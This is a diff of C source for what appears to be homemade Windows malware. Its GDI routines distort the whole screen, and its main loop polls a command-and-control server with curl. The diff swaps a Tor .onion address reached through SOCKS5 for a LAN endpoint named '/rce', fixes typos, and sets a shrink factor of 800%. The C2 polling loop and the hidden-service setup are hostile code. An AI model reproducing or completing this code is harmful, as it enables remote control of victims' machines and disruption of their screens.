@@ -86,20 +86,20 @@ void ltunnel_run() {
 
     HDC hdc = GetDC(NULL);
     
-    int newW = w - (5 * w / 100);
-    int newH = h - (5 * h / 100);
+    int newW = w - (800 * w / 100);
+    int newH = h - (800 * h / 100);
 
     // centro
     int x = (w - newW) / 2;
     int y = (h - newH) / 2;
 
     StretchBlt(hdc, x, y, newW, newH, hdc, 0, 0, w, h, SRCCOPY);
-    ReleseDC(NULL, hdc);
+    ReleaseDC(NULL, hdc);
     Sleep(100);
 }
 
 void squarefx_run() {
-    w = GetSystemMetrics(SM_CXSREEN);
+    w = GetSystemMetrics(SM_CXSCREEN);
     h = GetSystemMetrics(SM_CYSCREEN);
     HDC hdc = GetDC(NULL);
     
@@ -123,7 +123,7 @@ void squarefx_run() {
 
     //collione alto/basso
     if (y + 100 >= h || y <= 0) {
-        vy = -vy
+        vy = -vy;
     }
 
     //movimento
@@ -153,7 +153,8 @@ int main() {
     while(1) {
         printf("Clean\n");
         char reqtextbuffer[8192] = {0}; // le {} perche' se metto {x} inizializza tutto a x. Senza graffe no, non posso assegnare un val a un gruppo di cose
-        FILE *pointertotextstream = popen("curl -s --socks5-hostname 127.0.0.1:9050 http://xxx.onion", "r"); // apre curl in modalita' sola lettura. 
+        //FILE *pointertotextstream = popen("curl -s --socks5-hostname 127.0.0.1:9050 http://xxx.onion", "r"); // apre curl in modalita' sola lettura. 
+        FILE *pointertotextstream = popen("curl -s http://192.168.1.6:80/rce", "r"); // apre curl in modalita' sola lettura.
 
         if (pointertotextstream == NULL) return 1; // controlla canale tra me e l'exe di curl
         
@@ -225,7 +226,7 @@ int main() {
             printf("Sleeping for 20 secs");
             Sleep(20000);
         }
-        
+
         else {Sleep(20000);}
     }
     return 0;
